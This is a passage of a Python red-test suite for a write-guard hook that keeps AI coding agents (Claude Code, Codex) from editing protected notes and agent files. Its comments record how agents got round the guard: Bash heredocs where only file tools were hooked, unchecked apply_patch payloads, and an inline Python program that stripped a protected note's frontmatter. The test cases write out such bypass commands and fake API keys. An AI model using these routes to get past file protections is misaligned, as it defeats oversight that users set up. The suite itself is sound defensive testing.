    wg("wiring-unlock-control", {"file_path": A + "/.claude/settings.json",
                                 "content": "{}\n"}, 0, unlock=True)
    # And an ordinary script in the same folder must NOT be protected, or the
    # six reds above are just "Scripts/ is read-only", which is a different rule.
    wg("wiring-plain-script-control",
       {"file_path": A + "/06 AI Team/AI Team Knowledge/Scripts/checkpoint.py",
        "content": "print(1)\n"}, 0)

    # 67. fail-CLOSED (Vex ruling, 2026-09-14 security gate): garbage on
    #     stdin must BLOCK with the error named, never crash, never let the
    #     write through. Until that ruling this case asserted exit 0, which
    #     was a green reachable by feeding the guard malformed input.
    r = wg("fails-closed-on-bad-payload", None, 2, raw="{not json at all")
    checks += 1
    if "NOT checked" not in (r.stderr or ""):
        fails.append("write-guard/fails-closed-on-bad-payload: blocked without saying "
                     "the write was NOT checked; an unchecked write must say so")

    # 67p-67t. THE HIRING MARKER replaces the env-var unlock on the one write
    #     it exists for (pilot C finding F1). `ICOR_UNLOCK_WRITES=1` cannot be
    #     set on a single Edit call, so the guard's own remedy line routed both
    #     CLIs into `cat > AGENT.md` in Bash, where a hook registered on the
    #     file tools never looks. A guard whose documented remedy is "go around
    #     me" is a guard that has taught the model how to bypass it.
    #
    #     `new-agent.py` drops `06 AI Team/Agents/<Name>/.hiring`; the guard
    #     honours it for 24 hours and for that agent only; `check-hire.py`
    #     deletes it on a green run. Five cases: the marker opens the door,
    #     its absence closes it, a stale one closes it, one agent's marker
    #     does not open another's, and it does not open the entry files.
    #
    #     In its own fixture vault, never in this tree: a case that writes a
    #     marker into the real Agents/ folder is a case that opens a real door
    #     for as long as it runs.
    _hv = tmp / "hiring-vault"
    for _who in ("Alpha", "Beta"):
        (_hv / "06 AI Team" / "Agents" / _who).mkdir(parents=True)
        (_hv / "06 AI Team" / "Agents" / _who / "AGENT.md").write_text(
            "---\ntype: agent\n---\n\n# %s\n" % _who, encoding="utf-8")
    (_hv / "AGENTS.md").write_text("# fixture\n", encoding="utf-8")
    _H = str(_hv)
    _mk = _hv / "06 AI Team" / "Agents" / "Alpha" / ".hiring"
    _alpha = _H + "/06 AI Team/Agents/Alpha/AGENT.md"
    _beta = _H + "/06 AI Team/Agents/Beta/AGENT.md"
    # with no marker at all the contract is protected, which is the baseline
    # every green below is measured against
    wg("hiring-marker-absent-denies",
       {"file_path": _alpha, "old_string": "x", "new_string": "y"}, 2,
       tool="Edit", root=_H)
    _mk.write_text(_j.dumps({"started": _dt.datetime.now(_dt.timezone.utc)
                             .strftime("%Y-%m-%dT%H:%M:%SZ"),
                             "agent": "Alpha", "session_id": None}) + "\n",
                   encoding="utf-8")
    wg("hiring-marker-opens-the-contract",
       {"file_path": _alpha, "old_string": "x", "new_string": "y"}, 0,
       tool="Edit", root=_H)
    wg("hiring-marker-is-per-agent",
       {"file_path": _beta, "old_string": "x", "new_string": "y"}, 2,
       tool="Edit", root=_H)
    wg("hiring-marker-does-not-open-agents-md",
       {"file_path": _H + "/AGENTS.md", "content": "x\n"}, 2, root=_H)
    _mk.write_text(_j.dumps({"started": (_dt.datetime.now(_dt.timezone.utc)
                                         - _dt.timedelta(hours=25))
                             .strftime("%Y-%m-%dT%H:%M:%SZ"),
                             "agent": "Alpha", "session_id": None}) + "\n",
                   encoding="utf-8")
    wg("hiring-marker-stale-denies",
       {"file_path": _alpha, "old_string": "x", "new_string": "y"}, 2,
       tool="Edit", root=_H)

    # 67a-67m. THE PAYLOAD READER (pilot A finding F1, 2026-09-14).
    #     Every case above hands the guard a `file_path`, which is the one
    #     shape Claude Code uses. Codex has no such key: its only
    #     file-writing tool is `apply_patch` and the paths live INSIDE the
    #     patch body as headers. Silas captured the real payload in a
    #     throwaway fixture by replacing the guard with a dumper, and the
    #     first case below is those bytes verbatim. Against the shipped
    #     guard it exited 0 in silence while the protected note was
    #     destroyed, so the protected-path rule read as enforced on Codex
    #     and was not there at all.
    #
    #     WHAT THESE PROVE: that the reader finds the path in each shape.
    #     WHAT THEY DO NOT PROVE: that a host ever hands the guard a shell
    #     payload. hooks-rules.json registers this guard on the file_write
    #     kind only, so the shell cases below exercise a capability that no
    #     host routes to it yet; registering it on the shell kind is a
    #     separate decision with its own security gate.
    CAPTURED_CODEX = ('{"hook_event_name":"PreToolUse","tool_name":"apply_patch",'
                      '"cwd":' + _j.dumps(A) + ','
                      '"tool_input":{"command":"*** Begin Patch\\n'
                      '*** Update File: 00 Daily Scratchpad/2026-09-14.md\\n'
                      '@@\\n----\\n type: daily\\n*** End Patch"}}')
    wg("codex-apply-patch-captured-payload", None, 2, raw=CAPTURED_CODEX)
    wg("codex-apply-patch-add-file",
       {"command": "*** Begin Patch\n*** Add File: AGENTS.md\n+x\n*** End Patch"},
       2, tool="apply_patch")
    wg("codex-apply-patch-delete-file",
       {"command": "*** Begin Patch\n*** Delete File: 06 AI Team/Agents/Penn/AGENT.md\n"
                   "*** End Patch"}, 2, tool="apply_patch")
    wg("codex-apply-patch-move-to",
       {"command": "*** Begin Patch\n*** Update File: 04 Inner World/Notes/a.md\n"
                   "*** Move to: 00 Daily Scratchpad/2026-09-14.md\n*** End Patch"},
       2, tool="apply_patch")
    wg("codex-apply-patch-unlock-control",
       {"command": "*** Begin Patch\n*** Update File: AGENTS.md\n@@\n-x\n+y\n"
                   "*** End Patch"}, 0, tool="apply_patch", unlock=True)
    # the control: a patch that touches an ordinary note must pass, or the
    # five reds above are just "apply_patch is banned", which is a different
    # rule and a useless one.
    wg("codex-apply-patch-ordinary-control",
       {"command": "*** Begin Patch\n*** Update File: 04 Inner World/Notes/a-note.md\n"
                   "@@\n-x\n+y\n*** End Patch"}, 0, tool="apply_patch")
    # the shell write shapes, each one a way to reach a protected path
    # without ever naming a file_path key
    for nm, cmd in (
            ("shell-redirect", 'echo x > "00 Daily Scratchpad/2026-09-14.md"'),
            ("shell-append-redirect", 'echo x >> "00 Daily Scratchpad/2026-09-14.md"'),
            ("shell-cat-heredoc", "cat > AGENTS.md <<'EOF'\nx\nEOF"),
            ("shell-tee", 'echo x | tee -a "00 Daily Scratchpad/2026-09-14.md"'),
            ("shell-sed-i", "sed -i '' -e '1d' \"00 Daily Scratchpad/2026-09-14.md\""),
            ("shell-mv-into", 'mv /tmp/x.md "00 Daily Scratchpad/2026-09-14.md"'),
            ("shell-cp-into", 'cp /tmp/x.md "06 AI Team/Agents/Penn/AGENT.md"')):
        wg(nm, {"command": cmd}, 2, tool="Bash")
    # and the two controls that keep the shell reader from being a ban on
    # shell: naming a protected path as a READ argument is not a write, and
    # the sanctioned stamp is a shell call that names the scratchpad by design.
    wg("shell-read-only-control",
       {"command": 'grep -n type "00 Daily Scratchpad/2026-09-14.md" > /tmp/out.txt'},
       0, tool="Bash")
    wg("shell-stamp-processed-control",
       {"command": 'python3 "06 AI Team/AI Team Knowledge/Scripts/stamp-processed.py" '
                   '"00 Daily Scratchpad/2026/09/2026-09-14.md" --summary "x" '
                   '--into "[[A]]"'}, 0, tool="Bash")
    # 67u+. THE SHELL READER IS REGISTERED (Vex ruling, 2026-09-14 evening,
    #     vex-security-gate.md addendum). hooks-rules.json puts
    #     protected-paths and secret-shaped-value on the shell kind, so the
    #     seven reds above are now enforced and not just readable. What the
    #     ruling added, each with its control: `cd` tracked inside the
    #     command, a `;` glued to a word, a heredoc body that is data, a
    #     command it cannot tokenise (ALLOWED with a notice, never denied),
    #     git left to no-git-guard, the per-call prefix unlock, the .hiring
    #     marker as a protected path, and the secret rule scoped to writes
    #     INTO the vault and not into .env.
    wg("shell-cat-into-wip-allowed",
       {"command": "cat > \"04 Inner World/Notes/a-note.md\" <<'EOF'\nx\nEOF"},
       0, tool="Bash")
    wg("shell-blockquote-in-heredoc-control",
       {"command": "cat > \"04 Inner World/Notes/a-note.md\" <<'EOF'\n"
                   "> AGENTS.md is canonical\nEOF"}, 0, tool="Bash")
    wg("shell-glued-semicolon-read-control",
       {"command": "cp a.md /tmp/; cat AGENTS.md"}, 0, tool="Bash")
    wg("shell-cd-elsewhere-control",
       {"command": "cd /tmp && cat > AGENTS.md"}, 0, tool="Bash")
    wg("shell-cd-unresolvable-is-unknown-control",
       {"command": 'cd "$SOMEWHERE" && cat > AGENTS.md'}, 0, tool="Bash")
    wg("shell-subshell-cd-does-not-leak",
       {"command": "( cd /tmp && ls ) ; cat > AGENTS.md"}, 2, tool="Bash")
    wg("shell-touch-hiring-marker",
       {"command": 'touch "06 AI Team/Agents/Penn/.hiring"'}, 2, tool="Bash")
    wg("write-tool-cannot-plant-hiring-marker",
       {"file_path": A + "/06 AI Team/Agents/Penn/.hiring", "content": "{}\n"}, 2)
    wg("apply-patch-cannot-plant-hiring-marker",
       {"command": "*** Begin Patch\n*** Add File: 06 AI Team/Agents/Penn/.hiring\n"
                   "+{}\n*** End Patch"}, 2, tool="apply_patch")
    wg("shell-secret-into-vault-note",
       {"command": "cat > \"04 Inner World/Notes/wiring.md\" <<'EOF'\nkey: "
                   + fake_anthropic + "\nEOF"}, 2, tool="Bash")
    wg("shell-secret-into-env-file-control",
       {"command": 'echo "ANTHROPIC_API_KEY=' + fake_anthropic + '" >> .env'},
       0, tool="Bash")
    wg("shell-secret-outside-vault-control",
       {"command": "cat > /tmp/red-test.md <<'EOF'\nkey: " + fake_anthropic + "\nEOF"},
       0, tool="Bash")
    r = wg("shell-prefix-unlock",
           {"command": "ICOR_UNLOCK_WRITES=1 sed -i '' 's/a/b/' AGENTS.md"}, 0, tool="Bash")
    checks += 1
    if "stood down" not in (r.stderr or ""):
        fails.append("write-guard/shell-prefix-unlock: allowed, but silently; an "
                     "unlocked write must leave a trace on stderr")
    wg("shell-prefix-unlock-is-not-any-value",
       {"command": "ICOR_UNLOCK_WRITES=0 sed -i '' 's/a/b/' AGENTS.md"}, 2, tool="Bash")
    r = wg("shell-git-status-untouched", {"command": "git status"}, 0, tool="Bash")
    checks += 1
    if (r.stderr or "").strip():
        fails.append("write-guard/shell-git-status-untouched: passed, but wrote to "
                     "stderr: " + (r.stderr or "").strip()[:120])
    r = wg("shell-unparseable-allowed-with-notice",
           {"command": 'echo "unterminated > AGENTS.md'}, 0, tool="Bash")
    checks += 1
    if "NOT applied" not in (r.stderr or ""):
        fails.append("write-guard/shell-unparseable-allowed-with-notice: allowed, but "
                     "without saying the rule was NOT applied")

    # 67v+. AN INTERPRETER HANDED ITS PROGRAM INLINE (Silas's Codex re-run
    #     2026-09-14/15, R1 HIGH). The first command below is the one two
    #     independent Codex runs wrote by themselves, verbatim, when told to
    #     delete a line from the protected daily note. The guard ran, read it,
    #     returned 0 and printed NOTHING, and the note lost its frontmatter
    #     fence in both fixtures. Three cases: the path is in the program so
    #     it is refused; a program naming no protected path is allowed but
    #     SAYS the rule was not applied; and an ordinary `python3 script.py`
    #     is left completely alone, or this rule is a ban on running python.
    _captured = ("python3 - <<'PY'\n"
                 "from pathlib import Path\n"
                 "p = Path('00 Daily Scratchpad/2026/09/2026-09-14.md')\n"
                 "before = p.read_bytes()\n"
                 "first, sep, rest = before.partition(b'\\n')\n"
                 "assert first == b'---'\n"
                 "p.write_bytes(rest)\n"
                 "PY")
    r = wg("interpreter-stdin-program-names-a-protected-path",
           {"command": _captured}, 2, tool="Bash")
    checks += 1
    if "NOT applied" not in (r.stderr or ""):
        fails.append("write-guard/interpreter-stdin-program-names-a-protected-path: "
                     "refused, but without saying the program body itself was not "
                     "read, which is the limit this case exists to keep visible")
    r = wg("interpreter-inline-program-allowed-with-notice",
           {"command": 'python3 -c "print(1 + 1)"'}, 0, tool="Bash")
    checks += 1
    if "NOT applied" not in (r.stderr or ""):
        fails.append("write-guard/interpreter-inline-program-allowed-with-notice: "
                     "allowed in silence; a confident wrong answer where an unsure "
                     "one would have spoken is the failure R1 is about")
    r = wg("interpreter-running-a-file-is-untouched",
           {"command": "python3 helper.py --flag"}, 0, tool="Bash")
    checks += 1
    if (r.stderr or "").strip():
        fails.append("write-guard/interpreter-running-a-file-is-untouched: a plain "
                     "`python3 script.py` produced output: "
                     + (r.stderr or "").strip()[:140])
    wg("interpreter-inline-program-unlocks-on-the-prefix",
       {"command": "ICOR_UNLOCK_WRITES=1 python3 -c \"open('AGENTS.md','w')\""},
       0, tool="Bash")
    # Vex, 2026-09-15 morning (gate addendum): the literal sweep reads the
    # PROGRAM text from the cwd in force at that segment, a `>` is a write
    # only into a path, a shell program is read exactly, and a protected
    # file's standalone bare name in a writing program is that file in the
    # program's cwd (which also makes the prefix case above a real control:
    # without the prefix that command is now refused). Five of these went red
    # on the pre-patch guard before they went green on this one.
    wg("interpreter-bare-protected-name-from-the-vault-root",
       {"command": "python3 -c \"open('AGENTS.md','w').write('x')\""}, 2, tool="Bash")
    wg("interpreter-bare-protected-name-elsewhere-control",
       {"command": "python3 -c \"open('AGENTS.md','w').write('x')\""}, 0, tool="Bash",
       raw=_j.dumps({"session_id": "red-test", "cwd": "/tmp/vex-elsewhere",
                     "hook_event_name": "PreToolUse", "tool_name": "Bash",
                     "tool_input": {"command":
                                    "python3 -c \"open('AGENTS.md','w').write('x')\""}}))
    wg("interpreter-bare-name-joined-onto-a-folder-control",
       {"command": "python3 -c \"import os; open(os.path.join('/tmp/fx', "
                   "'AGENTS.md'),'w').write('x')\""}, 0, tool="Bash")
    wg("interpreter-literal-follows-the-cd",
       {"command": "cd /tmp/vex-fx && python3 - <<'PY'\n"
                   "open('06 AI Team/Agents/Nolan/AGENT.md','w').write('x')\nPY"}, 0, tool="Bash")
    wg("interpreter-read-only-program-beside-a-shell-redirect-control",
       {"command": "python3 -c \"print(open('06 AI Team/Agents/Nolan/AGENT.md').read())\" > /tmp/vex-out.txt"},
       0, tool="Bash")
    wg("inline-shell-program-is-read-exactly",
       {"command": "bash -c 'echo x > \"06 AI Team/Agents/Nolan/AGENT.md\"'"}, 2, tool="Bash")
    wg("inline-shell-program-read-only-control",
       {"command": "bash -c 'grep x \"06 AI Team/Agents/Nolan/AGENT.md\" > /tmp/vex-out.txt'"}, 0, tool="Bash")
    wg("protected-path-in-cat-heredoc-prose-beside-an-interpreter-control",
       {"command": "python3 -c \"print(1)\" && cat > \"03 WiP/x.md\" <<'EOF'\n"
                   "see 06 AI Team/Agents/Nolan/AGENT.md and cp it\nEOF"}, 0, tool="Bash")

    # 67n. the secret guard must name the vendor it actually matched
    #     (pilot A finding F9). An Anthropic key was reported as an OpenAI
    #     key because the OpenAI shape `sk-...` matches `sk-ant-...` and sat
    #     first in the table. A block with the wrong label sends whoever
    #     reads it to rotate the wrong credential.
    r = wg("secret-label-names-the-right-vendor",
           {"file_path": A + "/04 Inner World/Notes/wiring.md",
            "content": "key: " + fake_anthropic + "\n"}, 2)
    checks += 1
    if "Anthropic" not in (r.stderr or "") or "OpenAI" in (r.stderr or ""):
        fails.append("write-guard/secret-label-names-the-right-vendor: an "
                     "Anthropic key was reported as %r"
                     % (r.stderr or "").strip()[:160])

    # 68-69. session-start.sh on a machine with no python3. The wrapper
    #     exists only for this case: it must say so in one line and exit 0,
    #     because a missing interpreter must never stop a session starting.
    checks += 1
    nopy = tmp / "no-python"
    nopy.mkdir()
    env = dict(_o.environ)
    env["PATH"] = str(nopy)
    r = subprocess.run(["/bin/sh", str(HERE / "session-start.sh")],
                       capture_output=True, text=True, env=env, input="{}")
    if r.returncode != 0:
        fails.append("session-start/missing-python: exit %d, must be 0" % r.returncode)
    elif "python3" not in r.stdout:
        fails.append("session-start/missing-python: exited 0 but said nothing about "
                     "python3, so the ritual silently did not happen")
    # the clean control: with python3 present it must actually run the three
    # scripts and name the session.
    checks += 1
    ss = tmp / "session-start-vault"
    shutil.copytree(ROOT, ss, ignore=shutil.ignore_patterns(".git"))
    env = dict(_o.environ)
    env["CLAUDE_PROJECT_DIR"] = str(ss)
    env.pop("ICOR_SESSION_ID", None)
    r = subprocess.run(["/bin/sh", str(ss / "06 AI Team/AI Team Knowledge/Scripts/session-start.sh")],
                       capture_output=True, text=True, env=env,
                       input=_j.dumps({"session_id": "red-test-session",
                                       "hook_event_name": "SessionStart"}))
    if r.returncode != 0:
        fails.append("session-start/clean-control: exit %d (%s)"
                     % (r.returncode, (r.stderr or "").strip()[:200]))
    else:
        for want in ("session id: red-test-session", "onboarding:", "vault health:",
                     "expansion packs:"):
            if want not in r.stdout:
                fails.append("session-start/clean-control: the ritual output is "
                             "missing %r" % want)
        if not (ss / ".icor-for-life/scripts/session.json").is_file():
            fails.append("session-start/clean-control: session.json was not written, "
                         "so checkpoint.py has nothing to bind a receipt to")
        # and a run that GOT a host id must not cry wolf
        if "GUARDS:" in r.stdout:
            fails.append("session-start/guards-off-line-control: the host sent a "
                         "session id and the ritual still announced that the guards "
                         "are off; a warning that fires on a good run is a warning "
                         "nobody reads")

    # 69b. THE GUARDS-ARE-OFF LINE (Silas's Codex re-run 2026-09-14/15, R2).
    #     Across four hooks-OFF Codex runs no model opened `doctor` or
    #     .codex/config.toml, so nothing inside the session said the guards
    #     were off and a scripted run reported a clean pass with no guard
    #     behind it. This script already knew, because it had to mint its own
    #     id. Run it with NO payload, which is exactly the hooks-off shape.
    checks += 1
    ss2 = tmp / "session-start-noid"
    shutil.copytree(ROOT, ss2, ignore=shutil.ignore_patterns(".git"))
    env = dict(_o.environ)
    env["CLAUDE_PROJECT_DIR"] = str(ss2)
    env.pop("ICOR_SESSION_ID", None)
    r = subprocess.run([PY, str(ss2 / "06 AI Team/AI Team Knowledge/Scripts/session-start.py")],
                       capture_output=True, text=True, env=env, input="")
    if "GUARDS:" not in r.stdout:
        fails.append("session-start/guards-off-line: it minted its own session id, "
                     "which only happens when no hook payload arrived, and said "
                     "nothing about the guards being off")
    elif "doctor" not in r.stdout:
        fails.append("session-start/guards-off-line: it warned, but did not name "
                     "where the trust state can be read")

    # 69c-69e. THE LIFE SNAPSHOT (Mack, 2026-09-15; Axon section 10 of the
    #     ICOR questions audit). Two rules, both named on the
    #     `session-start-ritual` row in hooks-rules.json:
    #
    #       life-snapshot-fixtures        the fixture suite is a suite at all
    #       life-snapshot-missing-report  an absent report reads as "not run",
    #                                     never as an empty life
    #
    #     WHAT THIS DOES NOT PROVE: that the READER obeys the missing line. It
    #     proves the ritual prints it and prints no goal list beside it.
    _LS = HERE / "life-snapshot.py"
    _LS_TEST = HERE / "test-life-snapshot.py"
    if not (_LS.is_file() and _LS_TEST.is_file()):
        skip("life-snapshot", "life-snapshot.py or test-life-snapshot.py is not "
                              "in Scripts/")
    else:
        # 69c. life-snapshot-fixtures, both halves. The suite must pass, and
        #      its own --break-me must still be able to fail it; a suite that
        #      stopped asserting would otherwise print OK forever.
        checks += 1
        _lsr = subprocess.run([PY, str(_LS_TEST)], capture_output=True, text=True)
        if _lsr.returncode != 0:
            fails.append("life-snapshot-fixtures/suite-passes: exit %d: %s"
                         % (_lsr.returncode,
                            (_lsr.stdout or _lsr.stderr or "").strip()[-300:]))
        checks += 1
        _lsr = subprocess.run([PY, str(_LS_TEST), "--break-me"],
                            capture_output=True, text=True)
        if _lsr.returncode == 0:
            fails.append("life-snapshot-fixtures/suite-can-go-red: --break-me "
                         "plants a wrong expectation and the suite still exited "
                         "0, so 57 green cases prove nothing")

        # 69d. The ritual's own snapshot line, on the vault it just ran in.
        #      Load-bearing for 69e: it proves a goal line is producible here,
        #      so its absence below means something.
        checks += 1
        _sr = subprocess.run([PY, str(ss / "06 AI Team/AI Team Knowledge/Scripts/session-start.py")],
                             capture_output=True, text=True,
                             env={**_o.environ, "CLAUDE_PROJECT_DIR": str(ss)},
                             input="")
        if "life snapshot:" not in _sr.stdout:
            fails.append("life-snapshot-fixtures/ritual-prints-it: the session "
                         "start ritual said nothing about the life snapshot, so "
                         "the six questions still cost a folder walk:\n%s"
                         % _sr.stdout[-300:])
        elif "Goals (" not in _sr.stdout:
            fails.append("life-snapshot-fixtures/ritual-prints-it: the ritual "
                         "named the snapshot but printed no goal line, so 69e "
                         "below would pass for the wrong reason:\n%s"
                         % _sr.stdout[-300:])

        # 69e. life-snapshot-missing-report. Delete the report AND the script
        #      that would regenerate it, which is the shape a member on a
        #      machine with no working Python actually has, then assert the
        #      ritual says "not run" rather than listing goals from memory.
        checks += 1
        _lsv = tmp / "life-snapshot-missing"
        shutil.copytree(ROOT, _lsv, ignore=shutil.ignore_patterns(".git"))
        _lssnap = _lsv / ".icor-for-life/scripts/snapshot.json"
        if _lssnap.is_file():
            _lssnap.unlink()
        (_lsv / "06 AI Team/AI Team Knowledge/Scripts/life-snapshot.py").unlink()
        _mr = subprocess.run([PY, str(_lsv / "06 AI Team/AI Team Knowledge/Scripts/session-start.py")],
                             capture_output=True, text=True,
                             env={**_o.environ, "CLAUDE_PROJECT_DIR": str(_lsv)},
                             input="")
        if _mr.returncode != 0:
            fails.append("life-snapshot-missing-report: the ritual exited %d with "
                         "no snapshot; absence is a known state, not a crash"
                         % _mr.returncode)
        elif "No life snapshot on this device yet." not in _mr.stdout:
            fails.append("life-snapshot-missing-report: a missing snapshot did not "
                         "produce the missing-file line:\n%s" % _mr.stdout[-400:])
        elif "from memory" not in _mr.stdout:
            fails.append("life-snapshot-missing-report: the missing-file line "
                         "shipped without the rule that goes with it (do not "
                         "answer from memory), so the reader is told a file is "
                         "absent and not what to do about it:\n%s"
                         % _mr.stdout[-400:])
        elif "Goals (" in _mr.stdout:
            fails.append("life-snapshot-missing-report: the ritual listed goals "
                         "with no snapshot on disk, which is the exact defect this "
                         "case exists to catch:\n%s" % _mr.stdout[-400:])

        # 69f. THE SIZE CAP (Vex gate 2026-09-15, F1 MEDIUM). Not a leak, a
        #      flood: this ritual prints into the session context at EVERY
        #      start, so an oversized brief repeats until somebody notices.
        #      Measured on the private vault before the cap: 5,000,809 bytes.
        #      This ritual never opens snapshot.json (it reads the child's
        #      stdout), so the character cap is the only surface here.
        #      The fixture is built by fixture_vault(), not by copying ROOT,
        #      and the planted goal carries a target_date. Until 2026-09-16
        #      this case copied ROOT raw and planted the goal UNDATED, and
        #      goals sort dated-first (life-snapshot.py:740) while the brief
        #      prints only the first six (:1054). The scaffold repo ships two
        #      goals, so the seventh line was the planted one and the case
        #      passed. Tom's vault has thirteen: the planted goal fell off the
        #      end of the brief, nothing was oversized, nothing was cut, and
        #      the case went red on a member for whom the cap was working
        #      perfectly (Brian Carroll, B2-1).
        checks += 1
        _capv = fixture_vault(tmp, "life-snapshot-cap")
        _capg = _capv / "04 Inner World/My Life/Goals"
        _capg.mkdir(parents=True, exist_ok=True)
        # The negative control, and the whole point of the rewrite: six plain
        # undated goals stand in front of the planted one in every way EXCEPT
        # the sort, so a future change that drops the target_date from the
        # plant, or that stops sorting dated goals first, shows up here as a
        # red rather than as a case that quietly stops measuring the cap.
        for _i in range(6):
            (_capg / ("ordinary-goal-%d.md" % _i)).write_text(
                "---\ntype: goal\nname: Ordinary goal %d\nstatus: active\n---\n" % _i,
                encoding="utf-8")
        (_capg / "oversized-title.md").write_text(
            "---\ntype: goal\nname: " + "Y" * 20000
            + "\nstatus: active\ntarget_date: 2099-01-01\n---\n",
            encoding="utf-8")
        _cr = subprocess.run([PY, str(_capv / "06 AI Team/AI Team Knowledge/Scripts/session-start.py")],
                             capture_output=True, text=True,
                             env={**_o.environ, "CLAUDE_PROJECT_DIR": str(_capv)},
                             input="")
        if len(_cr.stdout) > 18_000:
            fails.append("life-snapshot-fixtures/size-cap-on-the-brief: a 20000-"
                         "character goal name rendered %d characters into the "
                         "session; the brief must be cut at 16000"
                         % len(_cr.stdout))
        elif "brief cut at" not in _cr.stdout:
            fails.append("life-snapshot-fixtures/size-cap-on-the-brief: the brief "
                         "was short enough, but nothing said it had been cut; a "
                         "silent truncation is a brief that reads as complete:\n%s"
                         % _cr.stdout[-300:])

    # 70-75. the completion receipt (Codex audit finding 7). The defect this
    #     replaces: --assert-logged passed on ANY log dated today, so a
    #     morning log closed an afternoon session that wrote nothing.
    CP = HERE / "checkpoint.py"
    rv = tmp / "receipt-vault"
    shutil.copytree(ROOT, rv, ignore=shutil.ignore_patterns(".git"))
    mach = rv / ".icor-for-life/scripts"
    mach.mkdir(parents=True, exist_ok=True)
    for stale in (mach / "receipts").glob("*.json") if (mach / "receipts").is_dir() else []:
        stale.unlink()
    # TODAY, not a literal date. This fixture was pinned to 2026-09-14 and the
    # `--assert-logged-today` control went red the moment the clock rolled past
    # midnight, on a run that had changed nothing about checkpoint.py. A test
    # whose colour depends on the day it is run reports the calendar, not the
    # code, and the first thing anyone does with a red like that is start
    # looking for a defect that is not there.
    import datetime as _dtc
    _today = _dtc.date.today()
    _dstr = _today.isoformat()
    logdir = rv / ("06 AI Team/AI Team Knowledge/Session Logs/%04d/%02d"
                   % (_today.year, _today.month))
    logdir.mkdir(parents=True, exist_ok=True)
    logfile = logdir / ("%s-red-test-log.md" % _dstr)
    logfile.write_text("# log\n", encoding="utf-8")
    logrel = ("06 AI Team/AI Team Knowledge/Session Logs/%04d/%02d/%s-red-test-log.md"
              % (_today.year, _today.month, _dstr))

    def sess(sid):
        (mach / "session.json").write_text(_j.dumps(
            {"schema": 1, "session_id": sid, "started": _dstr + "T09:00:00Z",
             "id_source": "red test"}), encoding="utf-8")

    def cp(name, args, expect):
        global checks
        checks += 1
        env = dict(_o.environ)
        env.pop("ICOR_SESSION_ID", None)
        r = subprocess.run([PY, str(CP), str(rv)] + args, capture_output=True,
                           text=True, env=env)
        if r.returncode != expect:
            fails.append("checkpoint/%s: exit %d, expected %d (%s)"
                         % (name, r.returncode, expect, (r.stderr or "").strip()[:180]))
        if "Traceback" in (r.stderr or ""):
            fails.append("checkpoint/%s: crashed instead of refusing" % name)
        return r

    # no session id at all: refuse, and say which lever is missing
    (mach / "session.json").unlink(missing_ok=True)
    r = cp("receipt-no-session-id", ["--assert-logged"], 1)
    checks += 1
    if "session.json" not in (r.stderr or ""):
        fails.append("checkpoint/receipt-no-session-id: refused without naming the "
                     "lever that would fix it")
    # a session with no receipt: refuse
    sess("sess-morning")
    cp("receipt-missing", ["--assert-logged"], 1)
    # write one, and it closes
    cp("receipt-write", ["--write-receipt", "--output", logrel], 0)
    cp("receipt-clean-control", ["--assert-logged"], 0)
    # THE DEFECT ITSELF: a second session, same day, same log on disk. The
    # old check went green here. This one must not.
    sess("sess-afternoon")
    cp("receipt-wrong-session", ["--assert-logged"], 1)
    checks += 1
    r = subprocess.run([PY, str(CP), str(rv), "--assert-logged-today"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        fails.append("checkpoint/assert-logged-today-control: the weak alias must "
                     "still pass here, or it is not the old behaviour")
    # an output that changed after the receipt was written: refuse
    sess("sess-morning")
    logfile.write_text("# log\nedited after the receipt\n", encoding="utf-8")
    cp("receipt-output-changed", ["--assert-logged"], 1)
    logfile.write_text("# log\n", encoding="utf-8")
    # a receipt that names no session log: refuse
    cp("receipt-no-log-among-outputs", ["--write-receipt", "--output", "AGENTS.md"], 0)
    cp("receipt-without-a-session-log", ["--assert-logged"], 1)

    # 76-78. the release gate. build-release-zip.sh needs a git mirror, the
    #     gh CLI and the network, so the gate body lives in its own file and
    #     that file is what gets red-tested, with a stub runner.
    _skip_release = FAST and fast_skip(
        "release-gate/* and suite/survives-its-own-release",
        "3 case(s); they read the build script and run the gate body twice")
    RG = HERE / "release-gate-red-tests.sh"
    if _skip_release:
        RG = None
    elif not RG.is_file():
        skip("release-gate/runner",
             "release-gate-red-tests.sh is not here; the release residue gate "
             "strips the build scripts from the download, so this group runs in "
             "the scaffold repo and not in a member's vault")
        RG = None
    stub_fail = tmp / "stub-fail.py"
    stub_fail.write_text("import sys\nprint('FAIL a guard accepted bad input')\nsys.exit(1)\n")
    stub_ok = tmp / "stub-ok.py"
    stub_ok.write_text("print('OK 0/0 guards went red on bad input')\n")
    for name, stub, expect in ((("red-runner-blocks", stub_fail, 1),
                                ("clean-control", stub_ok, 0)) if RG else ()):
        checks += 1
        env = dict(_o.environ)
        env["ICOR_RED_RUNNER"] = str(stub)
        r = subprocess.run(["/bin/sh", str(RG), str(ROOT)], capture_output=True,
                           text=True, env=env)
        if r.returncode != expect:
            fails.append("release-gate/%s: exit %d, expected %d" % (name, r.returncode, expect))
    # and the gate must actually be wired into the build. A structural check,
    # named as one: it proves the CALL, with its argument, is in the file and
    # that the file reacts to a non-zero exit. It does not prove a real build
    # ran it; no red test can, because a build needs a git mirror, the gh CLI
    # and the network.
    #
    # The first version of this check searched for the filename anywhere in
    # the script and went green with the call replaced by `true`, because the
    # name still sat in a comment and in RESIDUE_PATHS. Watched, and fixed.
    #
    # This one is SKIPPED where the script is absent, and that is the normal
    # case in a member's vault: build-release-zip.sh maps our internals and
    # the release residue gate strips it from the download on purpose. Until
    # 2026-09-14 the read was unconditional at module level, so the suite died
    # with a FileNotFoundError traceback and `scaffold-init.py doctor` reported
    # `tested: RED` with a stack trace under it on every fresh install (pilot A
    # finding F6, pilot B F4). A skip with a reason is what the other
    # repo-dependent guards here already do.
    if _skip_release:
        pass
    elif not (HERE / "build-release-zip.sh").is_file():
        skip("release-gate/wired-into-build",
             "build-release-zip.sh is not here. The release gate strips it from "
             "the download on purpose (it maps the build internals), so this "
             "check runs in the scaffold repo and not in a member's vault")
    else:
        checks += 1
        brz = (HERE / "build-release-zip.sh").read_text(encoding="utf-8")
        # It runs against $PROBE, a copy of the staged tree, since 1.23.1: the
        # suite imports three Scripts modules, CPython wrote their .pyc files
        # into the staged tree, and a .pyc carries the absolute path of its
        # source, which is a mktemp name. Three zip entries changed on every
        # build and the release workflow's reproducibility comparison went red.
        # So the wiring check asserts BOTH halves: the gate is called, and it
        # is called on a byte-identical copy rather than on the bytes that ship.
        call = _r.search(r'if\s+!\s+[A-Za-z0-9_]+=\S+\s+sh\s+"[^"]*release-gate-red-tests\.sh"\s+"\$PROBE"\s*;\s*then'
